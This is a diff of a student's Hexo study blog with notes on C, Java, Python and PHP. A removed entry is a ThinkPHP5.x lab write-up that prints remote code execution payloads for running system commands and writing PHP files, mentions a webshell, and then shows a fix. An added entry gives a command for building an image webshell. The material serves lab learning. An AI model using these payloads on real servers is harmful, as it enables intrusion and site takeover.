-    <content><![CDATA[<p>1.(！flag) 等价于 (flag==0)<br>2.while(n)  是什么意思？<br>首先，n在这里被当作了一个条件<br>其次，当n为真时，进入while循环体（A）；否则跳出循环继续执行下面部分（B）。<br>while（n）<br>｛<br>循环体；//标识为A<br>｝<br>语句1；//标识为B<br>语句2；<br>3.如何用C语言将字符型数字转化成数值型数字<br>‘2’       通过     ‘2’ - ’0’ = 2<br>4.对于二维数组如何将什么上三角、下三角的值进行修改<br>考虑对角线很重要<br>比如 5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>       5 5 5 5 5<br>正三角线：左到右，i=j<br>反三角线：右到左，i+j=n-1<br>取大于等于或者小于等于号时就可以实现上三角之类的数操作</p>
-<p>1 定义语句、执行语句以分号 ；结尾</p>
-<p>2 必须有主函数   main（）</p>
-<p>3 标识符由字母、数字和下画线-组成，</p>
-<p>第一个字符必须是字母或下画线</p>
-<p>4 char字符型                 字符型数据（char），用来储存字符</p>
-<p>​                                       储存内容为字符对于ASCII 码</p>
-<p>5 getchar 是从键盘缓冲区获取一个字符（输入单个字时）</p>
-<p>而putchar是把参数指定的字符变量的字符输出（输出单个字符）</p>
-<p>eg：char ch；</p>
-<p>​         ch=getchar（): 运行到这里输入一个字符后必须回车一下getchar才返回</p>
-<p>putchar （ch）</p>
-<p>8 小数四舍五入  scanf （”%f”，&amp;a）</p>
-<p>​                             a=int（a*1000+0.5）/1000.0</p>
-<p>​                             printf(“%0.3f”,a)</p>
-<p>C中保留两位小数</p>
-<p>1、float a=3.456</p>
-<p>​      float b=(int)(a*1000+0.5)/100.0</p>
-<p>2、float a=23,456789</p>
-<p>​      printf(“%2f”,a);</p>
-<p>9 scanf( )式格式输入函数</p>
-<p>它从标准输入设备(键盘)读取输入的信息</p>
-<p>10 double area</p>
-<p>建立一个类型为双精度浮点小数的变量，这个变量的名称是area</p>
-<p>%5.2f含义：输出一个浮点数</p>
-<p>格式为小数点前最多保留5位有效数字</p>
-<p>​            小数点后最多保留2位有效数字</p>
-<h4 id="在C语言中，能够获取字符串的函数至少有两个："><a href="#在C语言中，能够获取字符串的函数至少有两个：" class="headerlink" title="在C语言中，能够获取字符串的函数至少有两个："></a>在C语言中，能够获取字符串的函数至少有两个：</h4><p>1.scanf()</p>
-<p>所在头文件：stdio.h</p>
-<p>语法：scanf(“格式控制字符串”,变量地址列表);</p>
-<p>接受字符串时：scanf(“%s”,字符数组名或指针);</p>
-<p>2.gets()</p>
-<p>所在头文件：stdio.h</p>
-<p>语法：gets(字符数组名或指针);</p>
-<p>两者在接受字符串时：</p>
-<p>1.不同点：<br>gets可以接收空格；而scanf遇到空格、回车和Tab键都会认为输</p>
-<p>入结束，所有它不能接收空格。</p>
-<p>2.相同点：</p>
-<p>字符串接受结束后自动加’\0’。</p>
-<h4 id="printf和puts的区别"><a href="#printf和puts的区别" class="headerlink" title="printf和puts的区别"></a>printf和puts的区别</h4><p>相同点：<br>两者都属于stdio.h这个头文件<br>都能输出字符串</p>
-<p>不同点：<br>puts（）在输出字符串时会将’\0’自动转换成’\n’进行输出，也就是说，puts方法输出完字符串后会自动换行。</p>
-<ul>
-<li><h2 id><a href="#" class="headerlink" title></a></h2></li>
+    <title>java学习记录</title>
+    <url>/2021/07/09/java/java1/</url>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p> 尝试了好几种编程软件，发生了不同程度报错</p>
+<p>pycharm：连接debugger失败</p>
+<p>sublintext：扩展较mafan</p>
+<p>eclipse：届时应该会用</p>
+<p>最终敲定在假期使用vscode来编程java</p>
+<h4 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h4><p>经过昨天的多次失败，今天成功运行了Java，打印出了helloworld</p>
+<p>总结一下：<strong>文件名需与类名一致</strong></p>
+<p>使用了两个命令 <strong>javac</strong> 和 <strong>java</strong>。</p>
+<p>执行前先用Javac编译，注意要带上后缀。</p>
+<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(269).png" alt="屏幕截图(269)"></p>
+<p><img src="/2021/07/09/java/java1/662E827A-FA32-4464-B0BD-40087F429E98.jpg" alt="img"></p>
+<h5 id="菜鸟教程上的基本语法："><a href="#菜鸟教程上的基本语法：" class="headerlink" title="菜鸟教程上的基本语法："></a>菜鸟教程上的基本语法：</h5><ul>
+<li><strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li>
+<li><strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li>
+<li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li>
+<li><strong>源文件名</strong>：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li>
+<li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li>
 </ul>
-<p> hexo new post 新建文章</p>
-<p>C 程序主要包括以下部分：</p>
-<ul>
-<li><p>预处理器指令</p>
-</li>
-<li><p>函数</p>
-</li>
-<li><p>变量</p>
-</li>
-<li><p>语句 &amp; 表达式</p>
-</li>
-<li><p>注释</p>
-<p>变量其实只不过是程序可操作的存储区的名称</p>
-<table>
-<thead>
-<tr>
-<th>char</th>
-<th>通常是一个字节（八位）。这是一个整数类型。</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>int</td>
-<td>对机器而言，整数的最自然的大小。</td>
-</tr>
-<tr>
-<td>float</td>
-<td>单精度浮点值。单精度是这样的格式，1位符号，8位指数，23位小数。</td>
-</tr>
-<tr>
-<td>double</td>
-<td>双精度浮点值。双精度是1位符号，11位指数，52位小数。</td>
-</tr>
-<tr>
-<td>void</td>
-<td>表示类型的缺失。</td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-<p>   C 程序中可用的存储类：</p>
-<ul>
-<li><p>auto</p>
-</li>
-<li><p>register</p>
-</li>
-<li><p>static</p>
-</li>
-<li><p>extern</p>
-</li>
-</ul>
-<p>求余、模运算符（%）时bai要求两数必须是整型数据。%就是bai取余数运算,也就是模运算（mod）。</p>
-<p>10/3在C语言里是整除的意思，结果是3</p>
-<p>10%3是求余，结果是余数1</p>
-<p>10.0/3会转换为两个double型的数相除，答案是3.3333</p>
-<p>   7%4的结果是3<br>   -7%4的结果是-3<br>   3%-4的结果是3（**<em>结果符号与被除数相同**</em>）</p>
-<p>代码输入时无需特意对齐，注意符号即可。</p>
+<p>突然发现之前无意中看到的vsdebugger有bug是真的，啊这</p>
+<p>调试半天都不行，还是直接cmd命令行更快。乌鱼子。。</p>
+<h4 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h4><p>清晨起来试了一下，很快嗷（doge）</p>
+<p>切换vscode里的断点，误打误撞成功了，直接可以编译运行Java文件，好耶</p>
+<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(271).png"></p>
+<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(273).png" alt="屏幕截图(273)"></p>
+<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(272).png"></p>
 ]]></content>
       <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>函数递归</title>
-    <url>/2020/11/14/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</url>
-    <content><![CDATA[<p> 递归思想</p>
-<p>格式：void recursion() </p>
-<p>{   statements;   … … …   recursion(); /* 函数调用自身 */  </p>
-<p> … … … </p>
-<p>}</p>
-<p>  int main() </p>
-<p>{   recursion();</p>
-<p> }</p>
-<p>应用到求<u><strong>阶乘上，还有斐波那契数列</strong></u></p>
-<p> 递归函数可以使它调用其本身</p>
-<p>但是存在不利情况：</p>
-<p>电脑空间大致分<strong>Heap（堆）</strong>和<strong>Stack（栈）</strong>两种。</p>
-<p><strong>栈</strong>是用于<strong>函数</strong>的空间。</p>
-<p>电脑调用一个函数，就会使用一层栈；</p>
-<p>相反，电脑中一个函数结束（return），就会释放这一层栈，<strong>连同在这层栈（这个函数）中定义的所有东西</strong>。</p>
-<p>不在栈中的，应该就在堆中。<strong>（这就是定义全区变量与局部变量的用处）</strong></p>
-<p><strong>如果调用太多层栈（太多个函数），**</strong>电脑就会暴空间！**</p>
-<p>所以说，调用递归函数，就会<strong>一层一层地压栈</strong>，<strong>电脑就会暴空间！</strong>（<strong>并不代表不建议用递归，只是作提示而已</strong>）</p>
-<p><strong>递归</strong>，就是<strong>递（一层一层地调用）</strong>，<strong>归（一层一层地返回）</strong>，这样会<strong>费很多时间</strong>！容易<strong>超时</strong>！</p>
-<p><strong>但是，</strong>我并<strong>不是</strong>说不用递归，<strong>而是</strong>说能用递推算法的，最好不用递归算法，（原因你知道）。</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>字符串连接</title>
-    <url>/2020/12/07/c/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5/</url>
-    <content><![CDATA[<h4 id="今日：与字符串链接有关的函数"><a href="#今日：与字符串链接有关的函数" class="headerlink" title="今日：与字符串链接有关的函数"></a>今日：与字符串链接有关的函数</h4><p>strcpy，strcat；<br>strcat函数：<br>将两个char类型连接。<br>strcpy函数：<br>头文件：#include &lt; string.h&gt; 和 #include &lt;stdio.h&gt;<br>功能：把从src地址开始且含有NULL结束符的字符串复制到以dest开始的 地址空间</p>
-<p>​                              可变参数  链接：<a href="https://blog.csdn.net/longintchar/article/details/85490103">https://blog.csdn.net/longintchar/article/details/85490103</a></p>
-<p>[^摘取自链接：<a href="https://blog.csdn.net/slk11580/article/details/79571478]">https://blog.csdn.net/slk11580/article/details/79571478]</a>: </p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>二维数组</title>
-    <url>/2020/11/08/c/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
-    <content><![CDATA[<p> 二维数组（矩阵）</p>
-<p>例子：int a[6] [6] ;//6*6,6行6列</p>
-<p>访问二维数组 </p>
-<p>例子: a[0] [0] 访问a数组，第一行第一列中的元素</p>
-<p>注意防止越界访问（取值范围）</p>
-<p>二维数组初始化，可用嵌套语句for</p>
-<p>二维数组也可以对部分元素赋值</p>
-<p>如 int a[3] [4]="{{1}，{5}，{9}}"每一列第一个数</p>
-<p>二维数组的[ ] [ ]第一个“[ ]”可以不写</p>
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>指针</title>
-    <url>/2020/11/08/c/%E6%8C%87%E9%92%88/</url>
-    <content><![CDATA[<p> 指针和指针变量</p>
-<p>char *pa;//  定义一个指向字符型的指针变量；</p>
-<p>int *pb;//   定义一个指向整型的指针变量；</p>
-<p>取地址运算符  &amp;</p>
-<p>取值运算符   *</p>
-<p>未理解的</p>
-<p>（now，a）</p>
-<p>( the addr of a is)</p>
-<p>避免访问未初始化的指针</p>
-]]></content>
-      <tags>
-        <tag>指针</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>程序实验三</title>
-    <url>/2020/11/12/c/%E7%A8%8B%E5%BA%8F%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
-    <content><![CDATA[<p> 1、整数取反时，可用到reverse函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int reverse(int n)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​          int temp&#x3D;0;</span><br><span class="line">​	while (n!&#x3D;0)</span><br><span class="line">​	&#123;</span><br><span class="line">​		temp&#x3D;temp*10+n%10;</span><br><span class="line">​		n&#x3D;n&#x2F;10;</span><br><span class="line">​		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	return temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>2、倒金字塔</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int i,n,j;</span><br><span class="line">	printf(&quot;请输入一个整数: \n&quot;);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	  for(j&#x3D;1;j&lt;i;j++)</span><br><span class="line">	    printf(&quot; &quot;);</span><br><span class="line">     	for(j&#x3D;2*n-1;j&gt;&#x3D;2*i-1;j--)</span><br><span class="line">     	printf(&quot;*&quot;);</span><br><span class="line">	     printf(&quot;\n&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>3、求和</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a,n,i,j,sum;</span><br><span class="line">	printf(&quot;请输入两个整数分别为a&#x3D; n&#x3D; \n&quot;);</span><br><span class="line">	scanf(&quot;%d %d&quot;,&amp;a,&amp;n);</span><br><span class="line">	sum&#x3D;0,j&#x3D;0;</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">		j&#x3D;j*10+a;</span><br><span class="line">		sum&#x3D;sum+j;</span><br><span class="line">		printf(&quot;a+aa+aaa+.....&#x3D;%d\n&quot;,sum);</span><br><span class="line">	&#125; </span><br><span class="line">	return 0;</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <tags>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>水仙花数、素数</title>
-    <url>/2020/10/31/c/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0%E3%80%81%E7%B4%A0%E6%95%B0/</url>
-    <content><![CDATA[<p>   <strong>水仙花数</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int a,b,c,d;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">	b&#x3D;a&#x2F;100;</span><br><span class="line">	c&#x3D;a&#x2F;10%10;</span><br><span class="line">	d&#x3D;a%10;</span><br><span class="line">	if(b*100+c*10+d&#x3D;&#x3D;b*b*b+c*c*c+d*d*d) printf(&quot;Yes&quot;);</span><br><span class="line">	else  printf(&quot;No&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>注意取余，若要求求出范围内的所有水仙花数，则用for语句。</p>
-<p>​    <strong>素数</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int IsPrime(int x)</span><br><span class="line"></span><br><span class="line">&#123;  int i;</span><br><span class="line"></span><br><span class="line">for(i&#x3D;2;i&lt;x;i++)</span><br><span class="line"></span><br><span class="line">if(!(x%i))</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">rerurn 1;</span><br><span class="line"></span><br><span class="line">&#125;                                     </span><br></pre></td></tr></table></figure>
-
-<p> 解释：x%i 的意思是 x对i求余，整个意思是 ：如果 x对i的余数是0      则为真</p>
-<p>​                                                   就接着执行下面的程序。 </p>
-<p>​                                                           </p>
-<h3 id="写prime函数判断一个数是否是素数"><a href="#写prime函数判断一个数是否是素数" class="headerlink" title="写prime函数判断一个数是否是素数"></a>写prime函数判断一个数是否是素数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main ( )</span><br><span class="line">&#123;</span><br><span class="line">int m,n,i,j,k;</span><br><span class="line">scanf(&quot;%d %d&quot;,&amp;m,&amp;n);</span><br><span class="line">for(i&#x3D;m;i&lt;&#x3D;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">if(i&#x3D;&#x3D;2) &#123; &#x2F;&#x2F;如果是bai2， 直接输出。</span><br><span class="line">printf( &quot;%d &quot;, i);</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">for(j&#x3D;2;j&lt;i;j++) &#x2F;&#x2F;应该是j&lt;i</span><br><span class="line">if(i%j&#x3D;&#x3D;0) break; &#x2F;&#x2F;这个break只能跳du出最内层的for循环</span><br><span class="line">if(j&#x3D;&#x3D;i) printf(&quot;%d &quot;,i); &#x2F;&#x2F;printf应该放到循zhi环外，并且只有当j&#x3D;&#x3D;i的时候i才是dao素数</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>c</tag>
+        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -802,6 +1029,43 @@
       </tags>
   </entry>
   <entry>
+    <title>python_tip</title>
+    <url>/2021/07/22/python/python_tip/</url>
+    <content><![CDATA[<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>搭建python的编程环境：subline text、pycharm……</p>
+<h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>变量，eg：message  =  ‘’Hello World”</p>
+<p>​                    print(message)</p>
+<p>输出：Hello World，这里我们添加了一个名为message的变量，它指向的值为文本“Hello World”。</p>
+<p>在程序中可随时改变变量的值，而python将始终记录变量的最新值。</p>
+<p>变量命名条件：</p>
+<p>​                        1.只能包含数字、字母和下划线。且开头只能以字母或下划线开头，不能以数字开头。</p>
+<p>​                        2.不能包含空格，但可以使用下划线来分隔其中的单词。</p>
+<p>​                        3.勿将python关键字和函数名作为变量名。</p>
+<p>​                        4.应该简短又具有描述性。</p>
+<p>​                        5.数字1和字母l，数字0和字母o要注意区分。</p>
+<p>若出现错误时，往往可以见到    Traceback（most recent call most）的解释器告知错误。</p>
+<p>字符串，就是一系列字符，用引号括起的都是字符串，单双引号皆可。</p>
+<p>“This is a string.”</p>
+<p>‘This is a string.’</p>
+<p>方法修改字符大小写：变量名.title()，首字母大写</p>
+<p>​                                       变量名.upper()，全部大写</p>
+<p>​                                        变量名.lower()，全部小写</p>
+<p>字符串的组合，引号里加上中括号，eg：</p>
+<p>​    <code>first_name = &quot;ada&quot;</code></p>
+<p>​    <code>last_name = &quot;lovelace&quot;</code></p>
+<p>​    <code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p>
+<p>​    <code>print(full_name)</code></p>
+<p>这里的字符串命名为f字符串，f是format（设置格式）的简写。</p>
+<p>添加空白：空格、制表符、换行符， /t, /n</p>
+<p>删除空白：方法rstrip</p>
+<p>同时给多个变量赋值：x，y，z = 0，0，0</p>
+<p>常量：在代码中，要指出应将特定的变量视为常量，可将其字母全部大写。</p>
+<p>注释：句子前加#号。</p>
+<h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3>]]></content>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python_visual</title>
     <url>/2021/07/19/python/python-visual/</url>
     <content><![CDATA[<p>​    使用Plotly可视化仓库</p>
@@ -836,48 +1100,36 @@
       </tags>
   </entry>
   <entry>
-    <title>ThiThinkPHP5.x 远程函数执行与sql注入</title>
-    <url>/2021/07/18/src/ThinkPHP5/</url>
-    <content><![CDATA[<p>实验地址：<a href="https://www.anquanlong.com/lab_detail?lab_id=4&lib=5">ThinkPHP5.x 远程函数执行与sql注入_安全龙-专注做企业网络安全服务与网络安全培训! (anquanlong.com)</a></p>
-<p>知识梳理：</p>
-<p><strong>PoC</strong>，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p>
-<p><strong>Exp</strong>，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p>
-<p><strong>Payload</strong>，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p>
-<p><strong>Shellcode</strong>，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。</p>
-<p>（用蚁剑连上之后，发现这是安全龙部署在阿里云上的环境）</p>
-<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(280).png"></p>
-<p>​    首先尝试了远程函数漏洞的初始语句：</p>
-<p><code>?s=index/\think\app/invokefunction&amp;function=system&amp;return_value=&amp;command=</code></p>
-<p><code>可执行Linux命令</code></p>
-<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(281).png"></p>
-<p>然后我们按照提示去写入一个文件，phpinfo的功能</p>
-<p>利用到了file_put_contents函数（POC分析）</p>
-<p><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=./test.php&amp;vars[1][]=&lt;?php%20phpinfo();?&gt;</code></p>
-<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191745523.png" alt="image-20210718191745523"></p>
-<p>回显出了数字18，表示我们写入文件成功</p>
-<p>接着进行访问</p>
-<p>test.php</p>
-<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191940910.png" alt="image-20210718191940910"></p>
-<p>出现如上页面，成功利用漏洞。</p>
-<p>接着我还尝试了一句话木马的写入，答案显然，也是可以写入并利用的。</p>
-<p>最后蚁剑连接即可。</p>
-<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(284).png"></p>
-<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(285).png"></p>
-<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(286).png"></p>
-<p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(287).png"></p>
-<p>利用完漏洞，对于我们来说最重要的学会去修复</p>
-<p>接下来学习修复这个漏洞</p>
-<p>1.添加一段代码到App.php的554行</p>
-<p><code>if (!preg_match(&#39;/^[A-Za-z](\w)*$/&#39;, $controller)) &#123;</code></p>
-<p><code>            throw new HttpException(404, &#39;controller not exists:&#39; . $controller);</code></p>
-<p><code>        &#125;</code></p>
-<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193014082.png" alt="image-20210718193014082"></p>
-<p>修改之后，使用原来的poc发现失效了</p>
-<p>漏洞修复成功。</p>
-<p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193101116.png" alt="image-20210718193101116"></p>
+    <title>爬虫</title>
+    <url>/2021/05/19/python/%E7%88%AC%E8%99%AB/</url>
+    <content><![CDATA[<p> 今天终于是成功做到了python爬虫</p>
+<p>之前的失败</p>
+<p>总结了一下太想当然直接搬人家代码</p>
+<p>所以有些库没安装都不认真看</p>
+<p>小小开心一下，嘿嘿</p>
+<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(214).png"></p>
+<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(215).png"></p>
+<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(216).png"></p>
 ]]></content>
       <tags>
-        <tag>漏洞复现</tag>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图片马</title>
+    <url>/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
+    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
+<p>  如 1.jpg与 2.php同在桌面，则：</p>
+<p>  cd   desktop</p>
+<ol start="2">
+<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
+<p><img src="/2021/02/22/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
+<p>​    </p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>upload-labs</tag>
       </tags>
   </entry>
   <entry>
@@ -1059,56 +1311,23 @@
       </tags>
   </entry>
   <entry>
-    <title>python_tip</title>
-    <url>/2021/07/22/python/python_tip/</url>
-    <content><![CDATA[<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>搭建python的编程环境：subline text、pycharm……</p>
-<h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>变量，eg：message  =  ‘’Hello World”</p>
-<p>​                    print(message)</p>
-<p>输出：Hello World，这里我们添加了一个名为message的变量，它指向的值为文本“Hello World”。</p>
-<p>在程序中可随时改变变量的值，而python将始终记录变量的最新值。</p>
-<p>变量命名条件：</p>
-<p>​                        1.只能包含数字、字母和下划线。且开头只能以字母或下划线开头，不能以数字开头。</p>
-<p>​                        2.不能包含空格，但可以使用下划线来分隔其中的单词。</p>
-<p>​                        3.勿将python关键字和函数名作为变量名。</p>
-<p>​                        4.应该简短又具有描述性。</p>
-<p>​                        5.数字1和字母l，数字0和字母o要注意区分。</p>
-<p>若出现错误时，往往可以见到    Traceback（most recent call most）的解释器告知错误。</p>
-<p>字符串，就是一系列字符，用引号括起的都是字符串，单双引号皆可。</p>
-<p>“This is a string.”</p>
-<p>‘This is a string.’</p>
-<p>方法修改字符大小写：变量名.title()，首字母大写</p>
-<p>​                                       变量名.upper()，全部大写</p>
-<p>​                                        变量名.lower()，全部小写</p>
-<p>字符串的组合，引号里加上中括号，eg：</p>
-<p>​    <code>first_name = &quot;ada&quot;</code></p>
-<p>​    <code>last_name = &quot;lovelace&quot;</code></p>
-<p>​    <code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p>
-<p>​    <code>print(full_name)</code></p>
-<p>这里的字符串命名为f字符串，f是format（设置格式）的简写。</p>
-<p>添加空白：空格、制表符、换行符， /t, /n</p>
-<p>删除空白：方法rstrip</p>
-<p>同时给多个变量赋值：x，y，z = 0，0，0</p>
-<p>常量：在代码中，要指出应将特定的变量视为常量，可将其字母全部大写。</p>
-<p>注释：句子前加#号。</p>
-<h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3>]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>爬虫</title>
-    <url>/2021/05/19/python/%E7%88%AC%E8%99%AB/</url>
-    <content><![CDATA[<p> 今天终于是成功做到了python爬虫</p>
-<p>之前的失败</p>
-<p>总结了一下太想当然直接搬人家代码</p>
-<p>所以有些库没安装都不认真看</p>
-<p>小小开心一下，嘿嘿</p>
-<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(214).png"></p>
-<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(215).png"></p>
-<p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(216).png"></p>
+    <title>php</title>
+    <url>/2021/02/14/php/php/</url>
+    <content><![CDATA[<h4 id="7-17"><a href="#7-17" class="headerlink" title="7.17"></a>7.17</h4><p>var关键字的用法</p>
+<p>var，variable  变量的意思。</p>
+<p>看看例子，如果我这样使用var：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 var $a&#x3D;123;</span><br><span class="line">2 echo $a;</span><br><span class="line">3 &#x2F;&#x2F;那么程序会提示语法错误，要去掉var这个变量定义才行。直接</span><br><span class="line">4 $a&#x3D;123;</span><br><span class="line">5 echo $a;</span><br><span class="line">6 &#x2F;&#x2F;这样才不会报错，php是弱类型语言，所以不声明类型是没问题的。</span><br></pre></td></tr></table></figure>
+
+<p>那var什么时候才能用，请看：</p>
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 class Test&#123;</span><br><span class="line">2 var $a&#x3D;123;&#x2F;&#x2F;访问控制，这里的var不用就不正常，当然你可以用public protected等关键词代替，来声明成员变量的属性</span><br><span class="line">3 </span><br><span class="line">4 &#125;</span><br><span class="line">5 $obj&#x3D;new Test();</span><br><span class="line">6 echo $obj-&gt;a;</span><br><span class="line">7 &#x2F;&#x2F;打印结果：123</span><br></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<p>如果把var换成public，一样可以的。<br>但是这个时候你在类中去掉var,什么访问修饰符都没有，那会提示语法错误的。</p>
+<p>​                                                           摘抄自<a href="https://www.cnblogs.com/lyf-blog/p/5681308.html">php中var关键字用法 - DespicableMe - 博客园 (cnblogs.com)</a></p>
 ]]></content>
       <tags>
-        <tag>python</tag>
+        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -1217,6 +1436,301 @@
       </tags>
   </entry>
   <entry>
+    <title>php拓展</title>
+    <url>/2021/02/19/php/php%E6%8B%93%E5%B1%95/</url>
